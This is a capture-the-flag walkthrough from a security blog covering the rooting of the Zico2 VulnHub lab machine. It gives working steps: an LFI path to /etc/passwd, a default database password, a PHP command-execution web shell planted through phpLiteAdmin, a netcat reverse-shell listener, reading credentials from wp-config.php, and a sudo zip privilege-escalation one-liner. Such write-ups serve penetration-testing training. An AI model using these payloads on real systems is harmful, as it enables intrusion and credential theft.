<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Zico2 VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-zico2-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-10-13T16:22:30+00:00">October 13, 2017</time><time class="updated" datetime="2025-06-10T20:30:01+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to take another boot2root challenge known as Zico2 By “Rafael”, where we have to root the system to complete the challenge.</span></p>
<p><span style="color: #000000;">Download this VM here: <a style="color: #000000;" href="https://www.vulnhub.com/entry/zico2-1,210/">https://download.vulnhub.com/zico/zico2.ova</a></span></p>
<p><span style="color: #000000;"><strong>Difficulty Level: </strong>Intermediate</span></p>
<h3><span style="color: #800000;"><strong>Penetration Methodologies</strong></span></h3>
<p><span style="color: #000000;"><strong>Scanning </strong></span></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">HTTP surfing</span></li>
<li><span style="color: #000000;">Directory enumeration</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">LFI</span></li>
<li><span style="color: #000000;">Obtaining reverse shell via netcat</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Login through SSH</span></li>
<li><span style="color: #000000;">Identify user’s credential</span></li>
<li><span style="color: #000000;">Abusing SUID binaries</span></li>
</ul>
<p><span style="color: #000000;"><strong>Capture the flag</strong></span></p>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Scanning</strong></span></h3>
<p><span style="color: #000000;">Let’s start off with finding IP using netdiscover and in this case, our IP is 192.168.1.108.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K17bjjHUGQI/XPAIw89mq_I/AAAAAAAAems/Cx9hyVhSCOclO2pPM6THGBx-g1EXnp60wCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Time to scan the Target’s IP with Nmap. The scan result shows port 22(ssh), port 111(rpcbind) and port  80 are open.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.108</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aV1bnKeb__0/XPAI0NXE6XI/AAAAAAAAenQ/tWG9UbSP1AYueF-U3ONK-Eo581gpZhrswCLcBGAs/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Since port 80 is running HTTP, so our obvious choice is to browse Target’s IP in the browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oMhs1imMv5w/XPAI0lwp7JI/AAAAAAAAenY/pPwXVNuxC5chTYsXj5MNKUpA_XV5ZstwACLcBGAs/s1600/3.png"/>                                           </span></p>
<p><span style="color: #000000;">We scroll through the page and click on “check them out” as can be seen in the following screenshot.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TcXg4o0e__k/XPAI0ghEhcI/AAAAAAAAenU/LwZ24n9qBpAOUHNPKta-ONDaWK_-RF_sgCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">After clicking on the previous page it takes us here and where we notice the URL which was looking for tools.html page and thus it could be vulnerable to LFI, let’s verify it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MkEBZSlwBrU/XPAI1r6lsrI/AAAAAAAAenc/2uhxADTGkzo39SRjZ8Qt-CGk-Sn35IDQwCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Here I tried to get LFI and succeeded with “/../../etc/passwd”. Now as we can read the content of passwd file we find a user ‘zico’ in there. Let’s just save this info for now.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-N-1VHuJrdIA/XPAI1umE7QI/AAAAAAAAeng/TWaG3uaMYE8oRWKg9eJUDPVq41di0Mz-gCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">While enumerating directories through dirb, found an interesting directory “/dbadmin”.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.108/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-O4UzCw9_KXk/XPAI1ngh2rI/AAAAAAAAenk/lCLFg22tb_oLjTcWiiiV0HYxh22UwBuNQCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;"> When we browse ‘/dbadmin’ directory, it displays a file named “test_db.php”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dcNVgWYRchs/XPAI2nzlS9I/AAAAAAAAeno/mklGqfxjRTcgakXj-ZXet9SOZ_NxoLStACLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Here, we can see a php database login page along with version name, so we can google things up or if we go by the name of “test_db” it hints at a default setup.</span></p>
<p><span style="color: #000000;">So tried ‘admin’ as password and it worked.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rojkHdsPK4w/XPAI2rBDWrI/AAAAAAAAens/AxujAwCRwx01LfNFy2n6zp6TYz_5_F5-wCLcBGAs/s1600/9.png"/></span></p>
<h3><span style="color: #800000;">Exploiting</span></h3>
<p><span style="color: #000000;">Next, we are using ‘Search<strong>sploit’ </strong>and as the name indicates, it will search for all exploits and shellcodes for phpliteadmin(in this case). In the screenshot we can see that it is vulnerable to Remote php code execution and EDB-ID for the same is ‘24044’. Once we copy it to the current working directory (/root/24044.txt) and open it, we find guidelines to exploit the db.</span></p>
<pre class="lang:default decode:true">searchsploit phpliteadmin
searchsploit -m 24044
cat 24044.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YXtyUkb6TjI/XPAIw8Emq0I/AAAAAAAAemw/qhKkTVng1kUZ3gyDycYiIeh6NEpyKKAhACLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Here we have followed the guidelines :</span></p>
<p><span style="color: #000000;"><u>Step1</u>: Created a database and named it ‘shell.php’ (we had to add the extension ‘.php’ with the database name)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MjHbFz5wja8/XPAIw7sC9ZI/AAAAAAAAemo/VyDcB2M94-cvROKDWSRFpnZU2Mlb_hKsQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;"><u>Step 2:</u> Created a table ‘shell’. Inside the table, we created a column ‘field’, selected the type of the column to be an ‘Integer’ and set the default value to “<strong>&lt;?php echo system($_GET[“cmd”]);</strong> <strong>?&gt;</strong>”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qVZLvfwCK8E/XPAIxpIW7JI/AAAAAAAAem0/yObKqGyJgGUyBxg_lHAvccLEFtbO-OSbgCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">From the following screenshot, it can be seen that our php code script has been saved in the database.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZpfjXz5evoE/XPAIx5g30_I/AAAAAAAAem4/4hFPsDplbKQQ6qC02yW7R0Eiwblp0Aj2QCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Now we just have to run the file (the full path of the created php file is exposed)</span></p>
<p><span style="color: #000000;">So, to execute the file we can use the previously detected LFI vulnerability. And we have got lucky as we are inside ‘www-data’ .</span></p>
<pre class="lang:default decode:true">http://192.168.1.108/view.php?page=../../usr/databases/shell.php&amp;cmd=whoami</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0OtYnl1yY20/XPAIyKd3E7I/AAAAAAAAem8/rV36QBjKrMQb7D0yvCtQeO1BoJ6GTUm4ACLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Time to set up a netcat listener in our local machine and run the python code inside the uploaded shell to get a reverse shell. (refer next screenshot for the listener)</span></p>
<p><span style="color: #000000;">Python code reference: <strong><u>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</u></strong></span></p>
<pre class="lang:default decode:true">http://192.168.1.108/view.php?page=../../usr/databases/shell.php&amp;cmd= python shell</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fLZWFDPy_sY/XPAIyUWRhRI/AAAAAAAAenA/yHQp1OB7SQcjalZ7DitCHoJG7Ub6Y9AuACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">To simulate a proper shell with TTY we use python one-liner. Once at the shell, we find ‘wp-config.php’ file inside “/home/zico/wordpress”.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234
python -c 'import pty;pty.spawn("bin/bash")'
ls
cd /home
ls
cd zico
ls
cd wordpress
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jwHMJqHUGss/XPAIzCBtO8I/AAAAAAAAenE/XpcEHvHOQAg3yaJn5scJ3qR9NqU6BE_fwCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Inside the wp-config.php file, we discover a database user <strong>zico and its </strong><strong>password</strong><strong>.</strong>  </span></p>
<pre class="lang:default decode:true">cat wp-config.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MkncMRjbMjo/XPAIzbw67VI/AAAAAAAAenI/9NfnQWvQPi8sAooqkFgI06yLtCWj4Xi3QCLcBGAs/s1600/18.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation </span></h3>
<p><span style="color: #000000;">We use recently discovered credentials to login through ssh.</span></p>
<p><span style="color: #000000;">Then we use the sudo command to list all the commands the user can run with root privileges and we can see that the user can run both tar and zip commands as root without the need to enter any password.</span></p>
<p><span style="color: #000000;">So, now in the process of escalating the privileges from “zico” to “root”. At first, we create a file ‘raj’ than we perform three different tasks in a single line of code: first, we zip the file ‘raj’ second move it to <strong>/tmp</strong><strong>/nisha.zip</strong> folder and lastly unzip it which will pop the root shell.</span></p>
<p><span style="color: #000000;">Finally, we get ‘flag.txt’ inside the root directory. Hence, we accomplished the task.</span></p>
<pre class="lang:default decode:true">ssh zico@192.168.1.108
sudo -l
touch raj
sudo zip /tmp/nisha.zip /home/zico/raj -T --unzip-command="sh -c /bin/bash"
cd /root
ls
cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZCYsDFMjlAY/XPAIzZrd0pI/AAAAAAAAenM/XLWJGIBb69g8x_KE3OEng7fIQwNqPYjswCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Here is the complete reference to exploit sudo rights: <a style="color: #000000;" href="https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/">https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/</a></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Nisha Yadav is trained in Certified Ethical hacking and Bug Bounty Hunter. She is currently working at Ignite Technologies as a Security Analyst. Connect with her <a style="color: #000000;" href="https://www.linkedin.com/in/nisha-yadav-90816120/"><strong>here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
